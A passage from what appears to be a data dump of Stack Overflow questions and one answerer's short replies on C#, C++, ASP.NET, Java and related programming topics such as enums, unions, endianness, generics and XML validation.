","33708","","<p>The code you are using will get the <code>WindowsIdentity</code> associated with the current thread (which is the identity ASP.NET is running on). Unless you are impersonating based on client user identity that won't work. You need to use this:</p>

<pre><code>HttpContext.Current.User.Identity.Name
</code></pre>
"
"<p>I have an enum of the following stucture:</p>

<pre><code>public enum DType
{       
    LMS =  0,
    DNP = -9,
    TSP = -2,
    ONM = 5,
    DLS =9,
    NDS = 1
}
</code></pre>

<p>I'm using this enum to get the names and the values. 
Since there is a requirement to add more types, I need to read the type and the values from an XML file. Is there any way by which I can create this enum dynamically from XML file so that I can retain the program structure.</p>
","33708","","<p>Probably, you should consider using a <code>Dictionary&lt;string, int&gt;</code> instead.</p>

<p>If you want to generate the <code>enum</code> at <strong>compile-time</strong> dynamically, you might want to consider <a href=""http://www.hanselman.com/blog/T4TextTemplateTransformationToolkitCodeGenerationBestKeptVisualStudioSecret.aspx"">T4</a>.</p>
"
"<p>I have been wondering about temp tables in sp's and how all that can effect concurrency.
SP made on a MSSQL 08 server.</p>

<p>If I have a SP where I create a temp table and drop it again like this:</p>

<pre><code>BEGIN

CREATE TABLE #MyTempTable
(
   someField int,
   someFieldMore nvarchar(50)
)

... Use of temp table here
... And then..

DROP TABLE #MyTempTable

END
</code></pre>

<p>This SP will be called very very often, so my question is can there ever occur concurrency issues here?</p>
","33708","","<p>Nope. Independent instances of the temporary table will be created per each connection.</p>
"
"<p>What is strong naming and how is it useful in .Net</p>
","33708","","<p>It can also be used to ensure that the assembly is not tampered since it's released from the original publisher.</p>
"
"<p>I recently came across a great data structures book,""<a href=""http://rads.stackoverflow.com/amzn/click/0131997467"">Data Structures Using C</a>"" (c) 1991, at a local Library book sale for <strong>only $2</strong>. As the book's title implies, the book covers data structures using the C programming language.</p>

<p>I got the book knowing it would be out-dated but would probably contain lots of advanced C topics that I wouldn't encounter elsewhere.</p>

<p>Sure enough within 5 minutes I found something I didn't know about C. I came across a section talking about the <code>union</code> keyword and I realized that I had never used it, nor ever seen any code that does. I was grateful for learning something interesting and quickly bought the book.</p>

<p>For those of you not knowledgeable about what a union is, the book uses a good metaphor to explain:</p>

<blockquote>
  <p>To fully understand the concept of a
  union, it is necessary to examine its
  implementation. A Structure may be
  regarded as a road map to an area of
  memory. It defines how the memory is
  to be interpreted. A union provides
  several different road maps for the
  same area of memory, and it is the
  responsibility of the programmer to
  determine which road map is in current
  use. In practice, the compiler
  allocates sufficient storage to
  contain the largest member of the
  union. It is the road map, however,
  that determines how that storage is to
  be interpreted.</p>
</blockquote>

<p><strong>I could easily come up with contrived situations or hacks where I would use a Union. (But I am not interested in contrived situations or hacks...)</strong></p>

<p><strong>Have you used or seen an implementation where using Union solved the problem **more elegantly** than not using a Union?</strong></p>

<p>Added bonus if you include a quick explanation of why using union was better/easier than not using a union.</p>
","33708","","<p>Indeed, it's a great tool when you write things like device drivers (a <code>struct</code> that you want to send to device that can have several similar but different formats) and you require precise memory arrangement...</p>
"
"<p>I currently have a need for a custom <code>ListViewItem</code> class - let's call it <code>MyListViewItem</code>.  It needs to have some additional data associated with each item, and perform some operations when the Checked property is changed.  I've tried several things, but currently the relevant code looks like this:</p>

<pre><code>class MyListViewItem : ListViewItem {
    new public bool Checked {
        get {
            return base.Checked;
        }
        set {
            base.Checked = value;
            // do some other things here based on value
        }
    }
    public MyListViewItem(Object otherData) {
        // ...
    }
}
</code></pre>

<p>The problem I'm having is that when I click on the item's checkbox in the ListView, my setter is never called.  Does anyone know what I am doing wrong?  I'm aware that I could use the ItemChecked event of the parent ListView, but that seems like a much less clean solution.  (Also I'm not actually passing an Object to the constructor, but that part isn't important here).</p>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/aa645625%28VS.71%29.aspx""><code>new</code></a> does not <code>override</code> the <code>base</code> member. It declares a new method with the same name. In VB.NET it's called <code>Shadows</code>.</p>

<p>Indeed, <code>new</code> doesn't do anything except turning off a compiler warning. The member you do not declare as <code>override</code> (and you can only do this if the <code>base</code> member is <code>virtual</code> or <code>override</code>) will be completely unrelated to the inheritance tree of the <code>base</code> member. </p>
"
"<p>So I mean compile without visual studio</p>
","33708","","<p>Go to the project directory (I assume .NET framework is in your <code>PATH</code>):</p>

<pre><code>msbuild &lt;enter&gt;
</code></pre>

<p>If you want to compile a bunch of C# source files (not in a project), you'd use the <code>csc</code> command. <code>vbc</code> is VB.NET compiler. <code>jsc</code> is JScript.NET compiler. <code>cl</code> is C++/CLI (&amp; plain C++) compiler.</p>
"
"<p>what does putting ""()"" after a word do? sometimes it doesn't work</p>
","33708","","<p>It calls a method. It's also used to declare an array, depending on the context.</p>
"
"<p>I want to convert <code>long</code> to <code>int</code>. </p>

<p>If the value of <code>long</code> > <code>int.MaxValue</code>, I am happy to let it wrap around. </p>

<p>What is the best way?</p>
","33708","","<p>Just do <code>(int)myLongValue</code>. It'll do exactly what you want (discarding MSBs and taking LSBs) in <code>unchecked</code> context (which is the compiler default). It'll throw <code>OverflowException</code> in <code>checked</code> context if the value doesn't fit in an <code>int</code>:</p>

<pre><code>int myIntValue = unchecked((int)myLongValue);
</code></pre>
"
"<p>I have a binary file that was created on a unix machine. It's just a bunch of records written one after another. The  record is defined something like this:</p>

<pre><code>struct RECORD {
  UINT32 foo;
  UINT32 bar;
  CHAR fooword[11];
  CHAR barword[11];
  UNIT16 baz;
}
</code></pre>

<p>I am trying to figure out how I would read and interpret this data on a Windows machine. I have something like this:</p>

<pre><code>fstream f;
f.open(""file.bin"", ios::in | ios::binary);

RECORD r;

f.read((char*)&amp;detail, sizeof(RECORD));

cout &lt;&lt; ""fooword = "" &lt;&lt; r.fooword &lt;&lt; endl;
</code></pre>

<p>I get a bunch of data, but it's not the data I expect. I'm suspect that my problem has to do with the endian difference of the machines, so I've come to ask about that.</p>

<p>I understand that multiple bytes will be stored in little-endian on windows and big-endian in a unix environment, and I get that. For two bytes, 0x1234 on windows will be 0x3412 on a unix system. </p>

<p>Does endianness affect the byte order of the struct as a whole, or of each individual member of the struct? What approaches would I take to convert a struct created on a unix system to one that has the same data on a windows system? Any links that are more in depth than the byte order of a couple bytes would be great, too!</p>
","33708","","<p>It affects each member independently, not the whole <code>struct</code>. Also, it does not affect things like arrays. For instance, it just makes bytes in an <code>int</code>s stored in reverse order.</p>

<p>PS. That said, there could be a machine with weird endianness. What I just said applies to most used machines (x86, ARM, PowerPC, SPARC).</p>
"
"<p>I have been messing around with recursion today. Often a programming technique that is not used enough.</p>

<p>I set out to recursively reverse a string. Here's what I came up with:</p>

<pre><code>//A method to reverse a string using recursion
    public String reverseString(String s){
        char c = s.charAt(s.length()-1);
        if(s.length() == 1) return Character.toString(c);   

        return c + reverseString(s.substring(0,s.length()-1));
    }
</code></pre>

<p>My question: is there a better way in Java?</p>
","33708","","<p>The best way is not to use recursion. These stuff are usually used to teach students the recursion concept, not actual best practices. So the way you're doing it is just fine. Just don't use recursion in Java for these kind of stuff in real world apps ;)</p>

<p>PS. Aside what I just said, I'd choose <code>""""</code> as the base case of my recursive function:</p>

<pre><code>public String reverseString(String s){
    if (s.length() == 0) 
         return s;

    return reverseString(s.substring(1)) + s.charAt(0);
}
</code></pre>
"
"<p>What is the difference between the following declarations:</p>

<pre><code>int* arr1[8];
int (*arr2)[8];
int *(arr3[8]);
</code></pre>

<p>What is the general rule for understanding more complex declarations?</p>
","33708","","<pre><code>int* arr[8]; // An array of int pointers.
int (*arr)[8]; // A pointer to an array of integers
</code></pre>

<p>The third one is same as the first.</p>

<p>The general rule is <a href=""http://unixwiz.net/techtips/reading-cdecl.html"">operator precedence</a>. It can get even much more complex as function pointers come into the picture.</p>
"
"<p>I was poking around in .NET Reflector, and noticed that for reference types like ""String"" for example, there is an explicit overload of the ""=="" operator:</p>

<pre><code>typeof(string).GetMethod(""op_Equality"", BindingFlags.Static | BindingFlags.Public)
</code></pre>

<p>returns: System.Reflection.MethodInfo for the ""=="" operator.</p>

<p>Due to its implementation, you can't do things like:</p>

<pre><code>if(""hi"" == 3)  // compiler error, plus code would throw an exception even if it ran)
</code></pre>

<p>However, the same thing works for value types:</p>

<pre><code>if((int)1 == (float)1.0)  // correctly returns true
if((int)1 == (float)1.2)  // correctly returns false
</code></pre>

<p>I'm trying to figure out exactly how .NET internally handles the type conversion process, so I was looking for the implementation of op_Equality() in .NET Reflector, but ""int"" doesn't have one.</p>

<pre><code>typeof(int).GetMethod(""op_Equality"", BindingFlags.Static | BindingFlags.Public)
</code></pre>

<p>returns null.</p>

<p>So, where is the default implementation for the ""=="" operator for value types?
I'd like to be able to call it via reflection:</p>

<pre><code>public bool AreEqual(object x, object y)
{
    if(x.GetType().IsValueType &amp;&amp; y.GetType().IsValueType)
        return x == y; // Incorrect, this calls the ""object"" equality override
    else
        ...
}
</code></pre>

<p><hr /></p>

<p>Edit #1:</p>

<p>I tried this, but it didn't work:</p>

<pre><code>(int)1 == (float)1;                          // returns true
System.ValueType.Equals( (int)1, (float)1 ); // returns false
</code></pre>

<p><hr /></p>

<p>Edit #2:</p>

<p>Also tried this, but no love:</p>

<pre><code>object x = (int)1;
object y = (float)1.0;

bool b1 = (x == y);                 // b1 = false
bool b2 = ((ValueType)x).Equals(y); // b2 = false
</code></pre>

<p>I beleive this .Equals operator on ValueType does not work due to this type check (ripped from .NET Reflector):</p>

<pre><code>ValueType.Equals(object obj)
{
    ...

    RuntimeType type = (RuntimeType) base.GetType();
    RuntimeType type2 = (RuntimeType) obj.GetType();
    if (type2 != type)
    {
        return false;
    }

    ...
</code></pre>
","33708","","<p><a href=""http://stackoverflow.com/questions/384294/where-is-the-implementation-of-internalequalsobject-obja-object-objb/384296#384296"">My answer</a> to another question provides the Rotor implementation. The actual code is implemented in the CLR as native code.</p>

<p>Specifically:</p>

<pre><code>// Compare the contents (size - vtable - sink block index).
BOOL ret = memcmp(
    (void *) (pThisRef+1), 
    (void *) (pCompareRef+1), 
    pThisRef-&gt;GetMethodTable()-&gt;GetBaseSize() - sizeof(Object) - sizeof(int)) == 0;
</code></pre>
"
"<p>I usually see this when looking at Win32 gui code.  My assumption is that it is a standard bitwise or, but I also occasionaly see it in C#, and it seems like there would be a better (well higher level) way to do the same thing there.  Anyway, here's an example:</p>

<pre><code>MessageBox(NULL, ""Window Creation Failed!"", ""Error!"", MB_ICONEXCLAMATION | MB_OK);
</code></pre>

<p>Thanks,</p>

<p>Seamus</p>
","33708","","<p>It's the bitwise or operator like other places. Basically, this technique is used when you want to set some attributes that are not mutually exclusive.</p>

<p>The function can easily check them with some code like this:</p>

<pre><code>if (arg &amp; MB_ICONEXCLAMATION) { // Show an exclamation icon...

}

// ...

if (arg &amp; MB_OK) { // Show an OK button

}
</code></pre>
"
"<p>The error message is ""The type or namespace name 'T' could not be found.""</p>

<p>???</p>

<pre><code>public static Expression&lt;Func&lt;T, bool&gt;&gt; MakeFilter(string prop, object val)
{
    ParameterExpression pe = Expression.Parameter(typeof(T), ""p"");
    PropertyInfo pi = typeof(T).GetProperty(prop);
    MemberExpression me = Expression.MakeMemberAccess(pe, pi);
    ConstantExpression ce = Expression.Constant(val);
    BinaryExpression be = Expression.Equal(me, ce);
    return Expression.Lambda&lt;Func&lt;T, bool&gt;&gt;(be, pe);
}
</code></pre>

<p>Related links:</p>

<p><a href=""http://stackoverflow.com/questions/791187/using-reflection-to-address-a-linqed-property"">http://stackoverflow.com/questions/791187/using-reflection-to-address-a-linqed-property</a></p>

<p><a href=""http://social.msdn.microsoft.com/forums/en-US/linqprojectgeneral/thread/df9dba6e-4615-478d-9d8a-9fd80c941ea2/"">http://social.msdn.microsoft.com/forums/en-US/linqprojectgeneral/thread/df9dba6e-4615-478d-9d8a-9fd80c941ea2/</a></p>

<p><a href=""http://stackoverflow.com/questions/658316/runtime-creation-of-generic-funct"">http://stackoverflow.com/questions/658316/runtime-creation-of-generic-funct</a></p>
","33708","","<p>There's no generic argument defined for your method. You should define one (<code>MakeFilter&lt;T&gt;</code>):</p>

<pre><code>public static Expression&lt;Func&lt;T, bool&gt;&gt; MakeFilter&lt;T&gt;(string prop, object val)
{
    ParameterExpression pe = Expression.Parameter(typeof(T), ""p"");
    PropertyInfo pi = typeof(T).GetProperty(prop);
    MemberExpression me = Expression.MakeMemberAccess(pe, pi);
    ConstantExpression ce = Expression.Constant(val);
    BinaryExpression be = Expression.Equal(me, ce);
    return Expression.Lambda&lt;Func&lt;T, bool&gt;&gt;(be, pe);
}
</code></pre>
"
"<p>I know that I can use implicit conversions with a class as follows but is there any way that I can get a instance to return a string without a cast or conversion?</p>

<pre><code>public class Fred
{
    public static implicit operator string(Fred fred)
    {
        return DateTime.Now.ToLongTimeString();
    }
}

public class Program
{
    static void Main(string[] args)
    {
        string a = new Fred();
        Console.WriteLine(a);

        // b is of type Fred. 
        var b = new Fred(); 

        // still works and now uses the conversion
        Console.WriteLine(b);    

        // c is of type string.
        // this is what I want but not what happens
        var c = new Fred(); 

        // don't want to have to cast it
        var d = (string)new Fred(); 
    }
}
</code></pre>
","33708","","<p>In fact, the compiler will implicitly cast <code>Fred</code> to <code>string</code> but since you are declaring the variable with <code>var</code> keyword the compiler would have no idea of your actual intention. You could declare your variable as string and have the value implicitly casted to string.</p>

<pre><code>string d = new Fred();
</code></pre>

<p>Put it differently, you might have declared a dozen implicit operators for different types. How you'd expect the compiler to be able to choose between one of them? The compiler will choose the actual type by default so it won't have to perform a cast at all.</p>
"
"<p>I am using linq to sql. I want to update my changed in object question using linq to sql using stored procedure any body have idea?</p>
","33708","","<p>Create your procedure. Drag it to the data context designer. It'll generate a method for you. Just call it with the appropriate arguments and you're done.</p>
"
"<p>Is there any guidance on actually using the SecureString in a secure manner? I don't see there being any way to even create the secure string in the first place, as you are going to need it to be typed in from a textbox at some point.</p>
","33708","","<p>It's all about reducing the attack surface. It won't magically make your application 100% secure but it certainly helps.</p>
"
"<p>I'm programming network headers and a lot of protocols use 4 bits fields. Is there a convenient type I can use to represent this information?</p>

<p>The smallest type I've found is a BYTE. I must then use a lot of binary operations to reference only a few bits inside that variable.</p>
","33708","","<p>Since the memory is byte-addressed, you can't address any unit smaller than a single byte. However, you can build the <code>struct</code> you want to send over the network and use <a href=""http://msdn.microsoft.com/en-us/library/ewwyfdbe%28VS.71%29.aspx""><strong>bit fields</strong></a> like this:</p>

<pre><code>struct A {
   unsigned int nibble1 : 4;
   unsigned int nibble2 : 4;
};
</code></pre>
"
"<p>For an unknown reason, I have 1 page that I can't access by ID to any of the component.</p>

<p>Here is some informations. The page use asp:Content because the website use MasterPage. Inside the asp:Content, this page has a asp:FormView with some data that I cannot access from the CodeBehind.</p>

<p>Here is the Page declaration:</p>

<blockquote>
  <p>&lt;%@ Page Language=""C#"" AutoEventWireup=""true"" CodeFile=""InfoAccount.aspx.cs"" Inherits=""Private_InfoAccount"" MasterPageFile=""~/MasterPagePrincipal.master"" %></p>
</blockquote>

<p>Here is the code in the page behind that doesn't compile :</p>

<pre><code>protected void FormView1_PreRender(object sender, EventArgs e)
{
    DateBirthdayValidator.MaximumValue = DateTime.Now.Date.ToString(""dd-MM-yy"");
}
</code></pre>

<p>Here is the error : </p>

<blockquote>
  <p>Error 2	The name 'DateBirthdayValidator' does not exist in the current context</p>
</blockquote>

<p>I have search in google, I got some answer about using FindControl but it doesn't work. Any idea?</p>

<h2>Edit1:</h2>

<p>I can access the FormView1 component but no the validator inside the EditItemTemplate. How can I access control that is inside the EditTemplate?</p>

<h2>Edit2:</h2>

<p>If I try: <code>FormView1.FindControl(""DateBirthdayValidator"")</code> it compile but always return null. So still doesn't work but at least I can access the FormView1...</p>
","33708","","<p>The problem is the validator you have declared in the form view does not really exist at the page level. It's a template that you define for your <code>FormView</code>. The parent control can instantiate a template (zero, one or more times, for instance think about each row in a <code>GridView</code>; and as a consequence, create its controls). You should try accessing it like:</p>

<pre><code>// Replace RangeValidator with the actual validator type, if different.
var v = (RangeValidator)myFormView.Row.FindControl(""DateBirthdayValidator"");
v.MaximumValue = ...;
</code></pre>

<p>Note that to be able to do this, your form view should be in the mode you declared your validator in (you can check this with the <code>CurrentMode</code> property) and you should have already called <code>DataBind</code> to bind it to a data source (so that at least single row exists, and thus an instance of the template is created).</p>
"
"<p>I have an array of bytes that I receive from an external entity.  It is a fixed size.  The bytes contain a unicode string, with 0 values to pad out the rest of the buffer:</p>

<p>So the bytes might be:</p>

<pre><code>H \0 E \0 L \0 L \0 \0 \0 \0 \0 \0 ... etc
</code></pre>

<p>I'm getting that buffer and converting it to a string like so:</p>

<pre><code>byte[] buffer = new byte[buffSize];
m_dataStream.Read(buffer, 0, buffSize);
String cmd = System.Text.Encoding.Unicode.GetString(buffer);
</code></pre>

<p>What I get back is a string that looks like this:</p>

<pre><code>""HELLO\0\0\0\0\0\0\0\0...""
</code></pre>

<p>How can I tell GetString to terminate the string at the first Unicode null (ie so I just get back ""HELLO"")?</p>

<p>Thanks for any input.</p>
","33708","","<p>If you're sure the rest is all \0, this would work:</p>

<pre><code>cmd = cmd.TrimEnd('\0');
</code></pre>

<p>Otherwise, if you just want to get everything before the first null:</p>

<pre><code>int index = cmd.IndexOf('\0');
if (index &gt;= 0)
   cmd = cmd.Remove(index);
</code></pre>

<p>Note that <code>Unicode.GetString</code> will take care of double \0s. You should just look for a single \0.</p>
"
"<p>Hi guys
     I am having some issues trying to convert a double to C++ string. Here is my code</p>

<pre><code>std::string doubleToString(double val)
{
    std::ostringstream out;
    out &lt;&lt; val;
    return out.str();
}
</code></pre>

<p>The problem I have is if a double is being passed in as '10000000'. Then the string value being returned is 1e+007</p>

<p>How can i get the string value as ""10000000""</p>
","33708","","<pre><code>#include &lt;iomanip&gt;
using namespace std;
// ...
out &lt;&lt; fixed &lt;&lt; val;
// ...
</code></pre>

<p>You might also consider using <code>setprecision</code> to set the number of decimal digits:</p>

<pre><code>out &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; val;
</code></pre>
"
"<p>Does the single responsibility principle mean that your validation rules should be external to the entity?</p>

<p>If so do you use one class per validation rule?</p>
","33708","","<p>Depends on your definition of <em>entity</em>. You can, for instance, validate input in every service layer but this validation might be handled by separate classes.</p>
"
"<p>I was once asked by a current employee how I would develop a frequency-sorted list of the ten thousand most-used words in the English language.  Suggest a solution in the language of your choosing, though I prefer C#.</p>

<p>Please provide not only an implementation, but also an explanation.</p>

<p>Thanks</p>
","33708","","<pre><code>IEnumerable&lt;string&gt; inputList; // input words.
var mostFrequentlyUsed = inputList.GroupBy(word =&gt; word)
  .Select(wordGroup =&gt; new { Word = wordGroup.Key, Frequency = wordGroup.Count() })
  .OrderByDescending(word =&gt; word.Frequency);
</code></pre>

<p>Explanation: I don't really know if it requires further explanation but I'll try. <code>inputList</code> is an array or any other collection providing source words. <code>GroupBy</code> function will group the input collection by some similar property (which is, in my code the object itself, as noted by the lambda <code>word =&gt; word</code>). The output (which is a set of groups by a specified key, the word) will be transformed to an object with <code>Word</code> and <code>Frequency</code> properties and sorted by <code>Frequency</code> property in descending order. You could use <code>.Take(10000)</code> to take the first 10000. The whole thing can be easily parallelized by <code>.AsParallel()</code> provided by PLINQ. The query operator syntax might look clearer:</p>

<pre><code>var mostFrequentlyUsed = 
     (from word in inputList
      group word by word into wordGroup
      select new { Word = wordGroup.Key, Frequency = wordGroup.Count() })
     .OrderByDescending(word =&gt; word.Frequency).Take(10000);
</code></pre>
"
"<p>I often find I am writing a class similar to the following (but with a varying number of members, types of members, etc).  Is it possible to do this automatically, easily, and for free?</p>

<p>So I would like to provide the parameters ""Foo"", ""int"", ""apples"", ""bool"", ""banana"", ""Bar"", and ""clementine"" and have the rest of code generated for me.</p>

<pre><code>public class Foo
{
   public Foo(int apples, bool banana, Bar clementine)
   {
      m_Apples = apples;
      m_Banana = banana;
      m_Clementine = clementine;
   }

   public int Apples
   {
      get { return m_Apples; }
      set { m_Apples = value; }
   }

   public bool Banana
   {
      get { return m_Banana; }
      set { m_Banana = value; }
   }

   public Bar Clementine
   {
      get { return m_Clementine; }
      set { m_Clementine = value; }
   }

   private int m_Apples;
   private bool m_Banana;
   private Bar m_Clementine;
}
</code></pre>
","33708","","<p>Take a look at <a href=""http://www.hanselman.com/blog/T4TextTemplateTransformationToolkitCodeGenerationBestKeptVisualStudioSecret.aspx"" rel=""nofollow"">T4 Engine</a>. It's included with VS2005 onwards.</p>
"
"<p>In my code I need to loop through the controls in a GroupBox and process the control only if it a ComboBox. I am using the code:</p>

<pre><code>foreach (System.Windows.Forms.Control grpbxChild in this.gpbx.Controls)
{
    if (grpbxChild.GetType().Name.Trim() == ""ComboBox"")
    {
        // Process here
    }
}
</code></pre>

<p>My question is: Instead of looping through all the controls and processing only the combo boxes is is possible to get only the combo boxes from the GroupBox? Something like this:</p>

<pre><code>foreach (System.Windows.Forms.Control grpbxChild in this.gpbx.Controls.GetControlsOfType(ComboBox))
{
    // Process here
}
</code></pre>
","33708","","<p>Since you are using C# 2.0, you're pretty much out of luck. You could write a function yourself. In C# 3.0 you'd just do:</p>

<pre><code>foreach (var control in groupBox.Controls.OfType&lt;ComboBox&gt;())
{
    // ...
}
</code></pre>

<p>C# 2.0 solution:</p>

<pre><code>public static IEnumerable&lt;T&gt; GetControlsOfType&lt;T&gt;(ControlCollection controls)
    where T : Control
{
    foreach(Control c in controls)
        if (c is T)
            yield return (T)c;
}
</code></pre>

<p>which you'd use like:</p>

<pre><code>foreach (ComboBox c in GetControlsOfType&lt;ComboBox&gt;(groupBox.Controls))
{
    // ...
}
</code></pre>
"
"<p>What is the theoretical/practical limit to the recursion depth in languages implementing Tail Call optimisation? (Please assume that the recurring function is properly tail call-ed).</p>

<p>My guess is that the theoretical limit is NONE, as there is no recursive process, even though it is recursive procedure. Practical limit would be that allowed by the main memory available to be used. Please clarify or correct if I am wrong somewhere.</p>
","33708","","<p>When a tail recursive function is optimized, it'll essentially become an iterative function. The compiler reuses the stack frame of the original call for subsequent calls, so you won't run out of stack space. <strong>If you are not allocating any heap memory (or any other kind of memory that's not on the stack, for that matter)</strong>, you can have infinitely deep (as long as you are patient enough ;)) recursion (think of it as an infinite loop; it has the same characteristics).</p>

<p>To summarize, there's no practical limit.</p>
"
"<p>If I know the number number y and know that 2^x=y, how do I compute x?</p>
","33708","","<p>Base 2 logarithm function:</p>

<pre><code>log2(y)
</code></pre>

<p>which is equivalent to:</p>

<pre><code>log(y) / log(2)
</code></pre>

<p>for arbitrary base.</p>
"
"<p>Is it possible to write in C# method in such a way that when I write</p>

<pre><code> String contestId = getParameter(""contestId"")
</code></pre>

<p>i get contestId in string, but when I write:</p>

<pre><code> int contestId = getParameter(""contestId"")
</code></pre>

<p>i get contestId parsed to integer?</p>

<p>This is only simple example showing what i try to achieve.</p>
","33708","","<p>Nope it's not possible to overload methods solely based on their return type. You could, however, introduce a generic parameter:</p>

<pre><code>T getParameter&lt;T&gt;(string input) {
    // ... do stuff based on T ...
}
</code></pre>

<p>And if you were using C# 3.0 you could use this method as:</p>

<pre><code>var str = getParameter&lt;string&gt;(""contestid"");
var integer = getParameter&lt;int&gt;(""contestid"");
</code></pre>

<p>thus saying the actual type only once.</p>
"
"<blockquote>
  <p><strong>Possible Duplicates:</strong><br />
  <a href=""http://stackoverflow.com/questions/439573/how-to-convert-a-single-char-into-an-int"">How to convert a single char into an int</a><br />
  <a href=""http://stackoverflow.com/questions/628761/character-to-integer-in-c"">Character to integer in C</a></p>
</blockquote>

<p>Can any body tell me how to convert a <code>char</code> to <code>int</code>?</p>

<pre><code>char c[]={'1',':','3'};

int i=int(c[0]);

printf(""%d"",i);
</code></pre>

<p>When I try this it gives 49.</p>
","33708","","<pre><code>int result = charValue - '0';
</code></pre>

<p>so your code would be:</p>

<pre><code>printf(""%d"", i - '0');
</code></pre>
"
"<p>I'm upgrading some classic asp pages to .net, but not all of them. Rather than go and modify all the links in this backwards system, which pulls some of its links from a cms data store. I would like to take advantage of http and just remove the code our of that file, and perform a programatic 301 so that all the other pages can just be upgraded piecemeal.</p>
","33708","","<pre><code>Response.Buffer = true
Response.Status = ""301 Redirect""
Response.AddHeader ""Location"", ""redirection-url-goes-here""
Response.End
</code></pre>
"
"<p>This can be broken down into a simple trio of equations:</p>

<pre><code>a + b = 3
b + c = 5
a + c = 4
</code></pre>

<p>How can I best approximate the values? Note, I'll have many more such totals and variables in real applications. Particularly, I want to find if its possible to usefully approximate the cost of food by item lists and totals from grocery receipts. I assume if I can figure out costs, there will be varying ranges of accuracy I can expect, so an extra would be knowing how likely the approximation is to be correct and within what range the price <em>must</em> be.</p>

<p>EDIT: I just don't see this getting an answer I'm comfortable with, because I failed to properly frame the question in the first place.</p>
","33708","","<p>You are dealing with a system of linear equations, to solve it:</p>

<p><a href=""http://www.codeproject.com/KB/cs/LinearEquationsSystemSoln.aspx"" rel=""nofollow"">http://www.codeproject.com/KB/cs/LinearEquationsSystemSoln.aspx</a></p>

<p>The basic idea is to build a matrix of coefficient in the equations and use <a href=""http://en.wikipedia.org/wiki/LU%5Fdecomposition"" rel=""nofollow"">LU decomposition</a> or <a href=""http://en.wikipedia.org/wiki/Gaussian%5Felimination"" rel=""nofollow"">Gaussian Elimination</a> to deduce the values of variables. <a href=""http://www.netlib.org/lapack/"" rel=""nofollow"">LAPACK</a> can help.</p>

<p>Follow up: LAPACK is a full featured library for dealing with all kind of linear algebra stuff (and it's damn efficient at this, there are also GPU based libraries, such as CUBLAS which runs on NVIDIA GPUs using CUDA). </p>

<p>If you are dealing with same number of equations than unknowns, you'll be dealing with simple equation solving solution.</p>

<p>Basically, if you have more unknowns than equations, you'll be dealing with something called <em>underdetermined system</em>. Similarly, you might be dealing with systems with more equations than unknowns (<em>overdetermined systems</em>). If you have an underdetermined system, you probably want to look for a <em>minimum norm</em> solution (there can be infinite number of solutions to a single underdetermined system). For overdetermined systems, we might be looking for so called <em>least squares solution</em>. For more info about these solutions, look at this: <a href=""http://www.netlib.org/lapack/lug/node27.html"" rel=""nofollow"">http://www.netlib.org/lapack/lug/node27.html</a>. These concepts are from linear algebra.  </p>
"
"<p>In C++, what is the difference between the following examples?</p>

<p><strong>Re-throw pointer</strong>:</p>

<pre><code>catch (CException* ex)
{
    throw ex;
}
</code></pre>

<p><strong>Simple re-throw</strong>:</p>

<pre><code>catch (CException* ex)
{
    throw;
}
</code></pre>

<p>When the re-throw is caught, will the stack trace be different?</p>
","33708","","<p>Yes. Basically, you are throwing the object yourself in the first case. It looks like you generated the exception yourself in the <code>throw ex</code> line. In the second case, you are just letting the original object go up in the call stack (and thus preserving the original call stack), those are different. Usually, you should be using <code>throw;</code>.</p>
"
"<p>Im getting a validation error when a user enters a Foreign name.  An example is:</p>

<p>System.Web.HttpRequestValidationException: A potentially dangerous Request.Form value was detected from the client (ctl00$pageContent$txtName=""Pedro Ãº logo"").</p>

<p>where the Ãº is being translated as &amp; # 250 ; (without the spaces of course)</p>

<p>These foreign characters are acceptable and should not be causing a validation error.  I want ASP.NET validation to validate using UTF-16 and not UTF-8</p>

<p>Many web sites, blogs, and forums say simply to turn off Validation.(ie ValidateRequest=""false"")</p>

<p>Is there a way around this WITHOUT turning off Validation?   Turning off Validation is not acceptable for this application.</p>

<p>Thanks,
Jeff</p>
","33708","","<p>It's not really possible to tweak request validation mechanism. It's kind of hardcoded. I don't see a reason you don't want to disable it. If you take care of sanitizing and HTML encoding all stuff you get from the user and you want to display on the page (which you should be doing anyway, regardless of ASP.NET request validation), you wouldn't need it much.</p>
"
"<p>I'm currently trying to port an app from asp.net to php, however I just hit a wall and need a hand with this.</p>

<p>I need to dump all the data an .aspx recieves via POST to a file, but I have no clue on how to do this</p>

<p>any ideas ?</p>
","33708","","<p>You can use <code>BinaryRead</code> to read from request body:</p>

<pre><code>Request.BinaryRead
</code></pre>

<p>Or you could get a reference to input <code>Stream</code> object with:</p>

<pre><code>Request.InputStream
</code></pre>

<p>Then you could use <a href=""http://stackoverflow.com/questions/444309/what-would-be-the-fastest-way-to-concatenate-three-files-in-c/444316#444316""><code>CopyStream</code></a>:</p>

<pre><code>using (FileStream fs = new FileStream(...))
    CopyStream(fs, Request.InputStream);
</code></pre>
"
"<p>What should I learn to develop software for iPhone?</p>

<p>Thanks</p>
","33708","","<p>If you're thinking about developing games, take a look at <a href=""http://unity3d.com/"" rel=""nofollow"">Unity3D</a></p>
"
"<p>My boss keeps asking me ""which version of .NET are we upgrading to"", to which I answer ""3.5, the latest one"".</p>

<p>But then he sees things about how .NET 3.5 is just a set of libraries on top of .NET 2.0 and I find myself having to explain it to him.</p>

<p>And of course the version of C# that ships with .NET 3.5 is actually C# 3.0. </p>

<p>What's a good way to explain the different versions of .NET to a non-techie type in a way that doesn't confuse them or freak them out?</p>
","33708","","<p>You should decompose .NET as a package of three different things:</p>

<ol>
<li>CLR, the runtime</li>
<li>Libraries</li>
<li>Languages, compilers and tools</li>
</ol>

<p>This way, it'll be pretty easier to explain.</p>

<p>For instance, in .NET 3.5 we have:</p>

<ol>
<li>.NET CLR v2.0</li>
<li>v3.5 assemblies</li>
<li>C# 3.0 compiler</li>
</ol>
"
"<p>If I have a large (>500MB) XML file to validate, does an XmlReader bring the whole thing into memory to perform validation?</p>

<p>I looked at <a href=""http://stackoverflow.com/questions/751511/validating-an-xml-against-referenced-xsd-in-c"">http://stackoverflow.com/questions/751511/validating-an-xml-against-referenced-xsd-in-c</a> for validation procedure.</p>

<p>thanks,
Mark</p>
","33708","","<p>No, if you use <code>XmlValidatingReader</code> (or <code>XmlReader</code> with appropriate settings) it won't load the whole XML file. The method described in the <strong>question</strong> uses <code>XmlDocument</code> class which <strong>does</strong> load the whole file. The <strong>accepted answer</strong> doesn't load the entire file so you'll be fine using it. </p>
"
"<p>I have some (small amount) of data that I'll need quick access to on inital load, but not after that.</p>

